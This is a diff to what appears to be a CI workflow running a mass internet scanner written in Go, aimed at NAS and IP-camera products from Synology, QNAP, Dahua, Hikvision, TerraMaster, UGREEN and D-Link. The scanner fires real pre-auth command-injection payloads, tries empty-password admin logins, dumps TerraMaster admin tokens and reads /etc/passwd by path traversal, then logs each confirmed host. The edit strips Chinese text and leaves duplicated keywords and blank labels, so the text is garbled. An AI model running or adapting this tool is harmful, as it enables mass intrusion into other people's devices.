@@ -69,8 +69,8 @@ jobs:
           python3 -c "
           import json, sys
           kw=['synology','diskstation','beestation','qnap','qts','quts','turbo nas',
-              'dahua','大华','eims','hikvision','海康','ismp','hikcentral','hybrid san',
-              'terramaster','铁威马','ugreen','绿联','ugos','asustor','adm','asustor',
+              'dahua','dahua','eims','hikvision','hikvision','ismp','hikcentral','hybrid san',
+              'terramaster','terramaster','ugreen','ugreen','ugos','asustor','adm','asustor',
               'nas','network storage','storage manager','dsm','webstation',
               'file station','surveillance station','video station']
           hits=[]
@@ -160,7 +160,7 @@ jobs:
               for h := range hitCh {
                 enc.Encode(h)
                 if h.Vuln {
-                  fmt.Printf("[CVE-2026-32746] %s:23 Synology telnetd → STACK BOF pre-auth RCE\n", h.IP)
+                  fmt.Printf("[CVE-2026-32746] %s:23 Synology telnetd  STACK BOF pre-auth RCE\n", h.IP)
                   count++
                 }
               }
@@ -247,7 +247,7 @@ jobs:
               // CVE-2021-44142: Samba vfs_fruit OOB write pre-auth RCE
               // Affected: Samba < 4.13.17, < 4.14.12, < 4.15.5
               // Synology DSM 6.2.x / 7.0.x bundled Samba in this range
-              out <- SMBHit{ip, "CVE-2021-44142", "Samba vfs_fruit pre-auth heap OOB → RCE (SMB:445)", hex[:min(len(hex), 80)]}
+              out <- SMBHit{ip, "CVE-2021-44142", "Samba vfs_fruit pre-auth heap OOB  RCE (SMB:445)", hex[:min(len(hex), 80)]}
             }
           }
 
@@ -369,7 +369,7 @@ jobs:
               enc := json.NewEncoder(outf)
               for h := range hitCh {
                 enc.Encode(h)
-                fmt.Printf("[%s] %s:%s → %s\n", h.CVE, h.IP, h.Port, h.Desc)
+                fmt.Printf("[%s] %s:%s  %s\n", h.CVE, h.IP, h.Port, h.Desc)
                 count++
               }
             }()
@@ -478,11 +478,8 @@ jobs:
             r := &Result{Base: base, Title: title}
             lower := strings.ToLower(base + " " + title)
 
-            // ─────────────────────────────────────────────────
-            // 1. CVE-2024-13985 — 大华 EIMS pre-auth cmd injection (CVSS 10)
             //    POST /capture_handle.action captureCommand=<cmd>
-            // ─────────────────────────────────────────────────
-            eimsFingerprints := []string{"/eims", "eims", "大华", "dahua"}
+            eimsFingerprints := []string{"/eims", "eims", "dahua", "dahua"}
             isEIMS := false
             for _, fp := range eimsFingerprints { if strings.Contains(lower, fp) { isEIMS = true; break } }
             if !isEIMS {
@@ -494,7 +491,6 @@ jobs:
             if isEIMS {
               r.Vendor = "Dahua-EIMS"
               // CVE-2024-13985: pre-auth command injection via captureCommand parameter
-              // Step 1: verify EIMS fingerprint — must return EIMS-specific JSON, NOT HTML
               eimsFP := false
               code0, body0 := get(base+"/bic/ssoService/v1/health", nil)
               if code0 > 0 && !bytes.Contains(bytes.ToLower(body0), []byte("<html")) &&
@@ -519,7 +515,6 @@ jobs:
               }
 
               if eimsFP {
-                // Step 2: fire echo payload — only real EIMS will echo the marker
                 marker := "EIMS13985OK"
                 payload := []byte("captureCommand=echo+" + marker + "&captureFlag=true")
                 code, body := post(base+"/capture_handle.action", payload,
@@ -533,16 +528,12 @@ jobs:
                     Desc: "Dahua EIMS pre-auth RCE CONFIRMED (command output in response)",
                     Path: "/capture_handle.action", Evid: trunc(body, 200)})
                 }
-                // No "potential" fallback — silently drop if no echo
               }
             }
 
-            // ─────────────────────────────────────────────────
-            // 2. CVE-2025-34067 — 海康 ISMP Fastjson pre-auth RCE (CVSS 10)
             //    POST /bic/ssoService/v1/applyCT  Fastjson @type deserialization
-            // ─────────────────────────────────────────────────
             isISMP := strings.Contains(lower, "ismp") || strings.Contains(lower, "hikcentral") ||
-              strings.Contains(lower, "海康") || strings.Contains(lower, "hikvision")
+              strings.Contains(lower, "hikvision") || strings.Contains(lower, "hikvision")
             if !isISMP {
               code, body := get(base+"/bic/", nil)
               if code > 0 && bytes.Contains(bytes.ToLower(body), []byte("bic")) { isISMP = true }
@@ -579,11 +570,8 @@ jobs:
               }
             }
 
-            // ─────────────────────────────────────────────────
-            // 3. CVE-2024-10442 — 群晖 Replication Service pre-auth OOB (CVSS 10)
             //    Port 7000/7001/5566: Replication Service binary protocol
             //    HTTP detection: check DSM version endpoint
-            // ─────────────────────────────────────────────────
             isSynology := strings.Contains(lower, "synology") || strings.Contains(lower, "diskstation") ||
               strings.Contains(lower, "beestation") || strings.Contains(lower, "dsm")
             if !isSynology {
@@ -595,7 +583,7 @@ jobs:
               // Check DSM version for replication service vulnerability
               code, body := get(base+"/webapi/entry.cgi?api=SYNO.Core.System&method=info&version=3", nil)
               if code == 200 && bytes.Contains(body, []byte("firmware_ver")) {
-                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2024-10442", Type: "version_check", Desc: "Synology DSM — check Replication Service version (OOB write, CVSS 10)", Path: "/webapi/entry.cgi", Evid: trunc(body, 300)})
+                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2024-10442", Type: "version_check", Desc: "Synology DSM  check Replication Service version (OOB write, CVSS 10)", Path: "/webapi/entry.cgi", Evid: trunc(body, 300)})
               }
               // Check if replication service port is accessible (done via masscan above)
               // Also check BeeStation manager endpoint
@@ -603,7 +591,6 @@ jobs:
               if code2 == 200 && !bytes.Contains(body2, []byte(`"error"`)) {
                 r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2024-10442", Type: "replication_api", Desc: "Synology Replication/Backup API accessible", Evid: trunc(body2, 200)})
               }
-              // CVE-2024-50629/30/31 — BeeStation CRLF+Auth bypass+SQLi chain (DEVCORE)
               code3, body3 := get(base+"/webapi/auth.cgi?api=SYNO.API.Auth&method=login&version=7&account=admin&passwd=&session=FileStation&format=sid", nil)
               if code3 == 200 && bytes.Contains(body3, []byte(`"sid"`)) {
                 r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2024-50629", Type: "empty_pass_login", Desc: "Synology auth empty password accepted (chain start)", Evid: trunc(body3, 200)})
@@ -612,20 +599,11 @@ jobs:
               // Mark here for HTTP-only detected Synology hosts
               code4, _ := get(base+"/webapi/entry.cgi?api=SYNO.Core.System&method=info&version=1", nil)
               if code4 == 200 {
-                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2026-32746", Type: "info", Desc: "Synology DSM — check telnet:23 for pre-auth RCE (telnetd SLC BoF)"})
+                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2026-32746", Type: "info", Desc: "Synology DSM  check telnet:23 for pre-auth RCE (telnetd SLC BoF)"})
               }
             }
 
-            // ─────────────────────────────────────────────────
-            // 4. CVE-2022-27596 — QNAP QTS DLNA SQLi webshell (CVSS 10)
             //    POST /api/v2/dlna/server_setting  device_name SQLi
-            // ─────────────────────────────────────────────────
-            // CVE-2024-21899 — QNAP pre-auth auth bypass (CVSS 9.8)
-            // CVE-2025-59385 — QNAP auth bypass by spoofing (CVSS 9.8)
-            // CVE-2023-47218 — QNAP QTS cmd injection (CVSS 8.7)
-            // CVE-2024-27130 — QNAP share.cgi stack overflow (CVSS 9.8)
-            // CVE-2024-50387 — QNAP SMB SAMR SQLi (detected separately)
-            // CVE-2025-62847/48/49 — QNAP Pwn2Own 2025 chain
             isQNAP := strings.Contains(lower, "qnap") || strings.Contains(lower, "qts") ||
               strings.Contains(lower, "turbo nas") || strings.Contains(lower, "quts")
             if !isQNAP {
@@ -639,7 +617,7 @@ jobs:
               code, body := post(base+"/api/v2/dlna/server_setting", dlnaPayload, "application/json", nil)
               if code == 200 || code == 400 {
                 r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2022-27596", Type: "endpoint_exposed",
-                  Desc: "QNAP DLNA API reachable without auth (pre-auth SQLi → webshell)", Path: "/api/v2/dlna/server_setting", Evid: trunc(body, 100)})
+                  Desc: "QNAP DLNA API reachable without auth (pre-auth SQLi  webshell)", Path: "/api/v2/dlna/server_setting", Evid: trunc(body, 100)})
               }
               // CVE-2024-21899: privWizard API bypass
               code2, body2 := get(base+"/cgi-bin/privWizard.cgi?action=getConf", nil)
@@ -655,13 +633,12 @@ jobs:
               code4, body4 := get(base+"/share/", nil)
               if code4 == 200 || code4 == 302 {
                 r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2024-27130", Type: "endpoint_exposed",
-                  Desc: "QNAP share.cgi reachable (stack BoF → RCE with share link ssid)", Path: "/share/", Evid: trunc(body4, 80)})
+                  Desc: "QNAP share.cgi reachable (stack BoF  RCE with share link ssid)", Path: "/share/", Evid: trunc(body4, 80)})
               }
-              // CVE-2025-59385 / CVE-2025-62849: auth bypass by spoofing — probe login
               authPayload := []byte(`{"api":"SYNO.API.Auth","version":7,"method":"login","account":"admin","passwd":"","session":""}`)
               code5, body5 := post(base+"/api/v1/auth", authPayload, "application/json", nil)
               if code5 == 200 && bytes.Contains(body5, []byte("authSid")) {
-                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2025-59385", Desc: "QNAP auth bypass by spoofing — session acquired", Evid: trunc(body5, 200)})
+                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2025-59385", Desc: "QNAP auth bypass by spoofing  session acquired", Evid: trunc(body5, 200)})
               }
               // Generic: QNAP admin panel without auth
               code6, body6 := get(base+"/cgi-bin/authLogin.cgi?user=admin&passhash=&serviceKey=1", nil)
@@ -669,14 +646,11 @@ jobs:
                 r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2025-62847", Desc: "QNAP empty-hash login success (Pwn2Own 2025 chain)", Evid: trunc(body6, 200)})
               }
               // CVE-2024-50387 info (SMB SAMR, checked separately)
-              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2024-50387", Type: "info", Desc: "QNAP QTS — check SMB:445 SAMR pipe for pre-auth SQLi"})
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2024-50387", Type: "info", Desc: "QNAP QTS  check SMB:445 SAMR pipe for pre-auth SQLi"})
             }
 
-            // ─────────────────────────────────────────────────
-            // 5. CVE-2021-33044/45 — 大华 IPC/NVR/XVR RPC2 auth bypass (CVSS 9.8, KEV)
             //    POST /RPC2  loginType=Direct  empty password accepted
-            // ─────────────────────────────────────────────────
-            isDahua := strings.Contains(lower, "dahua") || strings.Contains(lower, "大华") ||
+            isDahua := strings.Contains(lower, "dahua") || strings.Contains(lower, "dahua") ||
               strings.Contains(lower, "imou") || strings.Contains(lower, "lechange")
             if !isDahua {
               code, body := get(base+"/RPC2", nil)
@@ -705,11 +679,7 @@ jobs:
               }
             }
 
-            // ─────────────────────────────────────────────────
-            // 6. CVE-2023-28808 — 海康威视 Hybrid SAN/Cluster pre-auth auth bypass (CVSS 9.1)
-            //    JS call crafted messages → admin without auth
-            // ─────────────────────────────────────────────────
-            isHikvision := strings.Contains(lower, "hikvision") || strings.Contains(lower, "海康") ||
+            isHikvision := strings.Contains(lower, "hikvision") || strings.Contains(lower, "hikvision") ||
               strings.Contains(lower, "ezviz") || strings.Contains(lower, "hikcentral")
             if !isHikvision {
               code, body := get(base+"/ISAPI/System/deviceInfo", nil)
@@ -742,12 +712,8 @@ jobs:
               }
             }
 
-            // ─────────────────────────────────────────────────
-            // 7. CVE-2022-24990 / CVE-2022-36536 — 铁威马 TOS (CVSS 9.8)
-            //    GET /module/api.php?mobile/webNasIPS → admin token + hash
             //    POST /module/api.php?mobile/php_upgradeOS version=;cmd;
-            // ─────────────────────────────────────────────────
-            isTerramaster := strings.Contains(lower, "terramaster") || strings.Contains(lower, "铁威马") || strings.Contains(lower, "tos")
+            isTerramaster := strings.Contains(lower, "terramaster") || strings.Contains(lower, "terramaster") || strings.Contains(lower, "tos")
             if !isTerramaster {
               code, _ := get(base+"/module/api.php?mobile/webNasIPS", nil)
               if code == 200 { isTerramaster = true }
@@ -757,7 +723,7 @@ jobs:
               // CVE-2022-24990: unauthenticated admin token dump
               code, body := get(base+"/module/api.php?mobile/webNasIPS", nil)
               if code == 200 && (bytes.Contains(body, []byte("token")) || bytes.Contains(body, []byte("password"))) {
-                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2022-24990", Desc: "TerraMaster TOS webNasIPS leaks admin token (→ instant RCE)", Path: "/module/api.php?mobile/webNasIPS", Evid: trunc(body, 300)})
+                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2022-24990", Desc: "TerraMaster TOS webNasIPS leaks admin token ( instant RCE)", Path: "/module/api.php?mobile/webNasIPS", Evid: trunc(body, 300)})
               }
               // CVE-2022-36536: upgrade cmd injection
               upgradePayload := []byte("version=%3Becho%20CVE36536%3B&type=1")
@@ -768,7 +734,7 @@ jobs:
               // CVE-2021-27890: path traversal SQLi on pathList
               code3, body3 := get(base+"/tos/index.php?explorer/pathList&path='", nil)
               if code3 == 200 && (bytes.Contains(bytes.ToLower(body3), []byte("sql")) || bytes.Contains(body3, []byte("error"))) {
-                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2021-27890", Desc: "TerraMaster pathList SQLi (cred dump → RCE)", Path: "/tos/index.php?explorer/pathList", Evid: trunc(body3, 150)})
+                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2021-27890", Desc: "TerraMaster pathList SQLi (cred dump  RCE)", Path: "/tos/index.php?explorer/pathList", Evid: trunc(body3, 150)})
               }
               // CVE-2021-45002: unauthenticated file read
               code4, body4 := get(base+"/module/api.php?file/downloadFile&filepath=../../etc/passwd", nil)
@@ -777,12 +743,9 @@ jobs:
               }
             }
 
-            // ─────────────────────────────────────────────────
-            // 8. CVE-2025-14188 — 绿联 UGOS NAS post-auth cmd injection
             //    POST /v1/file/backup/create path parameter
             //    (requires admin creds, mark endpoint for manual follow-up)
-            // ─────────────────────────────────────────────────
-            isUGREEN := strings.Contains(lower, "ugreen") || strings.Contains(lower, "绿联") || strings.Contains(lower, "ugos")
+            isUGREEN := strings.Contains(lower, "ugreen") || strings.Contains(lower, "ugreen") || strings.Contains(lower, "ugos")
             if !isUGREEN {
               code, body := get(base+"/v1/system/info", nil)
               if code == 200 && bytes.Contains(bytes.ToLower(body), []byte("ugos")) { isUGREEN = true }
@@ -793,7 +756,7 @@ jobs:
               code, body := get(base+"/v1/system/info", nil)
               if code == 200 {
                 r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2025-14188", Type: "post_auth_cmd_inject",
-                  Desc: "UGREEN UGOS — POST /v1/file/backup/create?path=;cmd; (needs admin creds)", Path: "/v1/file/backup/create", Evid: trunc(body, 150)})
+                  Desc: "UGREEN UGOS  POST /v1/file/backup/create?path=;cmd; (needs admin creds)", Path: "/v1/file/backup/create", Evid: trunc(body, 150)})
               }
               // Also check for shared TLS cert weakness
               code2, body2 := get(base+"/api/auth/login", nil)
@@ -802,9 +765,7 @@ jobs:
               }
             }
 
-            // ─────────────────────────────────────────────────
             // 9. Generic NAS exposures
-            // ─────────────────────────────────────────────────
             // D-Link NAS CVE-2024-3273 cmd injection
             code, body := get(base+"/cgi-bin/nas_sharing.cgi?dbg=1&cmd=51&system=id&user=messagebus&passwd=", nil)
             if code == 200 && (bytes.Contains(body, []byte("uid=")) || bytes.Contains(body, []byte("volume"))) {
@@ -864,7 +825,7 @@ jobs:
                     c := v.CVE; if c == "" { c = v.Type }
                     cves = append(cves, c)
                   }
-                  fmt.Printf("[VULN] %-50s vendor=%-18s → %v\n", r.Base, r.Vendor, cves)
+                  fmt.Printf("[VULN] %-50s vendor=%-18s  %v\n", r.Base, r.Vendor, cves)
                   mu.Unlock()
                 }
               }(t)
@@ -912,16 +873,16 @@ jobs:
           cat nas-shard-*/smb_vulns.jsonl   2>/dev/null          > merged/smb_vulns_all.jsonl
           cat nas-shard-*/dahua_tcp_vulns.jsonl 2>/dev/null      > merged/dahua_tcp_all.jsonl
 
-          echo "===== NAS 扫描汇总 ====="
-          echo "开放端口:       $(wc -l < merged/open_ports_all.txt)"
-          echo "NAS Web 指纹:   $(wc -l < merged/nas_live_all.jsonl)"
-          echo "HTTP 漏洞主机:  $(wc -l < merged/http_vulns_all.jsonl)"
-          echo "Telnet 漏洞:    $(wc -l < merged/telnet_vulns_all.jsonl)"
+          echo "===== NAS  ====="
+          echo ":       $(wc -l < merged/open_ports_all.txt)"
+          echo "NAS Web :   $(wc -l < merged/nas_live_all.jsonl)"
+          echo "HTTP :  $(wc -l < merged/http_vulns_all.jsonl)"
+          echo "Telnet :    $(wc -l < merged/telnet_vulns_all.jsonl)"
           echo "SMB Samba:      $(wc -l < merged/smb_vulns_all.jsonl)"
           echo "Dahua TCP37777: $(wc -l < merged/dahua_tcp_all.jsonl)"
 
           echo ""
-          echo "=== CVE 分布 ==="
+          echo "=== CVE  ==="
           python3 -c "
           import json
           from collections import Counter
@@ -939,7 +900,7 @@ jobs:
           " 2>/dev/null
 
           echo ""
-          echo "=== 高危确认 (RCE/Auth Bypass, 非 info 类型) ==="
+          echo "===  (RCE/Auth Bypass,  info ) ==="
           python3 -c "
           import json
           confirmed = []
@@ -952,13 +913,13 @@ jobs:
                 confirmed.append({'host': r['base'], 'cve': v.get('cve',''), 'desc': v.get('desc',''), 'evid': v.get('evidence','')[:80]})
             except: pass
           for c in confirmed[:100]:
-            print(f\"[{c['cve']}] {c['host']} → {c['desc']}\")
+            print(f\"[{c['cve']}] {c['host']}  {c['desc']}\")
             if c['evid']: print(f\"  Evidence: {c['evid']}\")
           print(f'\nTotal confirmed: {len(confirmed)}')
           " 2>/dev/null
 
           echo ""
-          echo "=== Vendor 分布 ==="
+          echo "=== Vendor  ==="
           python3 -c "
           import json
           from collections import Counter
